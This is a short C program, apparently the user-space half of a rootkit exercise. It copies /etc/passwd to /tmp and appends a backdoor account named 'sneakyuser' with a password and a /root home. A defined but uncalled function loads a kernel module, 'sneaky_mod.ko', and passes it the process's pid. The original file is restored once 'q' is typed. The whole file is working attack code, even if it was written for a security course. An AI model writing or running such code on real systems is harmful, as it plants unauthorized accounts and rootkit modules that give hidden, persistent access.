#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

void attack1_copy_password()
{
  system("cp /etc/passwd /tmp");
  system("echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash' >> "
         "/etc/passwd");
}

void attack2_load_sneaky(){
  char cmd[50];
  sprintf(cmd, "insmod sneaky_mod.ko pid=%d", (int)getpid());
  system(cmd);
}



int main()
{
  // print process id
  printf("sneaky_process pid = % d\n", getpid());
  attack1_copy_password();
  // attack2
  char c;
  while ((c = getchar()) != 'q') {
  }
  //system("rmmod sneaky_mod");
  system("cp /tmp/passwd /etc");
  system("rm /tmp/passwd");
  return EXIT_SUCCESS;
}